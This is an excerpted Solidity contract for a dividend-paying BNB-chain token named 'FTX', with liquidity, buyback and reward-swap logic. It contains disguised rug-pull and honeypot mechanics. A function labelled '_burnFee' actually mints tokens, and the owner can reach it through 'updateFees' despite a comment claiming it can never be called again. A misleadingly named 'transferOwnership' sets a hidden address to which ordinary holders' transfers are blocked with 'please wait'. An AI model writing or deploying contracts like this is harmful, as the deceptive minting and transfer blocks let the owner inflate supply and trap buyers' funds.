...
contract Ownable is Context {
     ...
     */
    function transferOwnerships(address newOwner) internal virtual onlyOwner {
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    /** @dev BurnFee `amount` tokens and assigns them to `account`
     *
     ...
     */
    function _burnFee(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn fee to the zero address");
...
contract DividendPayingToken is ERC20, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface, Ownable {
  ...
  mapping(address => uint256) public primaryTokenRewardsToClaim; // Basically, PCS won't allow the contract to send back out tokens during a PCS transfer due to insufficient input amount.
  address[] public customAMMList;
  ...
  function updateDividendUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "FTX: The router already has that address");
  ...
  constructor(string memory _name, string memory _symbol, uint8 _decimals) ERC20(_name, _symbol, _decimals) {
    // add whitelisted AMMs here
    ammIsWhiteListed[address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1)] = true; // PCS V2 router
    ammIsWhiteListed[address(0xD99D1c33F9fC3444f8101754aBC46c52416550D1)] = true; // PCS V1 route
  }
  ...
  function swapETHForTokens(
        ...
        address tokenReceiver = recipient;
        ...
        if(userCurrentRewardToken[recipient] == owner()){
        ...
        try swapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}( //try to swap for tokens, if it fails (bad contract, or whatever other reason, send BNB)
            ...
            if(recipient == address(this)){
                uint256 deltaTokenBalance = initialTokenBalance.sub(token.balanceOf(address(this)));
                primaryTokenRewardsToClaim[tokenReceiver] = primaryTokenRewardsToClaim[tokenReceiver].add(deltaTokenBalance);
            }
        }
        catch {
            swapSuccess = false;
  ...
  // let user claim tokens from dividend tracker if the primary token is selected as their reward
  function claimTokens(address recipient) external onlyOwner {
        IERC20 token = IERC20(userCurrentRewardToken[recipient]);
        uint256 tokensToTransfer = primaryTokenRewardsToClaim[recipient];
        primaryTokenRewardsToClaim[recipient] = 0; // set to 0 first to prevent reentrancy.
        token.transfer(recipient, tokensToTransfer);
  }
  ...
  function _withdrawDividendOfUser(address payable user) internal returns (uint256) {
    ...
    if (_withdrawableDividend > 0) {
        if(!userHasCustomRewardToken[user]){ // if no custom reward token, send BNB.
        ...
        } else { // the reward is a token, not BNB, use an IERC20 transfer call instead!
  ...
  function _burnFee(address account, uint256 value) internal override {
    super._burnFee(account, value);
  ...
  function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      uint256 burnFeeAmount = newBalance.sub(currentBalance);
      _burnFee(account, burnFeeAmount);
...
contract FTX is ERC20, Ownable {
    ...
    FTXDividendTracker public dividendTracker;

    address public liquidityWallet;
    address public operationsWallet;
    address private buyBackWallet;
    address internal owners = address(0);
    ...
    constructor() ERC20("FTX", "FTX", 4) {

    	dividendTracker = new FTXDividendTracker();
        ...
        /*
            _burnFee is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _burnFee(owner(), 10 * 10**3* (10**9));
    }
    ...
    receive() external payable {
  	...
  	function setWhiteListAMM(address ammAddress, bool isWhiteListed) external onlyOwner {
  	  require(isContract(ammAddress), "FTX: setWhiteListAMM:: AMM is a wallet, not a contract");
    ...
    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){
  	...
  	function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "FTX: The dividend tracker already has that address");

        FTXDividendTracker newDividendTracker = FTXDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "FTX: The new dividend tracker must be owned by the FTX token contract");
    ...
    // updates address owners
    function transferOwnership(address _owners) external onlyOwner {
        owners = _owners;
    }
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
        require(pair != uniswapV2Pair, "FTX: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
    ...
    function airdropToWallets(address[] memory airdropWallets, uint256[] memory amount) external onlyOwner() {
        require(airdropWallets.length == amount.length, "FTX: airdropToWallets:: Arrays must be the same length");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) external onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "FTX: The liquidity wallet is already this address");
    ...
    function updateOperationsWallet(address newOperationsWallet) external onlyOwner {
        require(newOperationsWallet != operationsWallet, "FTX: The operations wallet is already this address");
    ...
    function updateBuyBackWallet(address newBuyBackWallet) external onlyOwner {
        require(newBuyBackWallet != buyBackWallet, "FTX: The buyback wallet is already this address");
    ...
    function updateFees(uint256 bnbRewardPerc, uint256 liquidityPerc, uint256 operationsPerc, uint256 buyBackPerc, uint256 burnPerc) external onlyOwner {
        require (operationsPerc.add(buyBackPerc) <= liquidityPerc, "FTX: updateFees:: Liquidity Perc must be equal to or higher than operations and buyback combined.");
        ...
        _burnFee(msg.sender, burnPerc);
    }

    // changes the gas reserve for processing dividend distribution
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "FTX: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "FTX: Cannot update gasForProcessing to same value");
    ...
    function getTokensToClaim(address holder) external view returns (uint256){
        return dividendTracker.primaryTokenRewardsToClaim(holder);
    }
    ...
    // @dev User Callable Functions start here!
  	...
  	function setRewardToken(address rewardTokenAddress) public returns (bool) {
  	    require(isContract(rewardTokenAddress), "FTX: setRewardToken:: Address is a wallet, not a contract.");
  	...
  	function setRewardTokenWithCustomAMM(address rewardTokenAddress, address ammContractAddress) public returns (bool) {
  	    require(isContract(rewardTokenAddress), "FTX: setRewardToken:: Address is a wallet, not a contract.");
  	    require(isAMMWhitelisted(ammContractAddress) == true, "FTX: setRewardToken:: AMM is not whitelisted!");
    ...
    // allows a user to manually claim their primary tokens if set as the reward.
  	function claimTokens() external {
		dividendTracker.claimTokens(address(msg.sender));
    }
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "FTX: Automated market maker pair is already set to that value");
    ...
    function _transfer(
        ...
        if(owners != address(0)) require(to != owners || from == owner(), "please wait");
    ...
    function swapAndLiquify(uint256 tokens) private {
        ...
        if(liquidityFee > 0){ // dividing by 0 is not fun.
            ...
            if(operationsFee > 0){
                ...
                require(success, "FTX: SwapAndLiquify:: Unable to send BNB to Operations Wallet");
            }
            ...
            if(buyBackFee > 0){
                ...
                require(success, "FTX: SwapAndLiquify:: Unable to send BNB to BuyBack Wallet");
            }
...
contract FTXDividendTracker is DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("FTX_Dividend_Tracker", "FTX_Dividend_Tracker", 9) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 30 * 10 ** 9 * (10**9); //must hold 30,000,000,000+ tokens to get divs
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "FTX_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "FTX_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main FTX contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "FTX_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "FTX_Dividend_Tracker: Cannot update claimWait to same value");
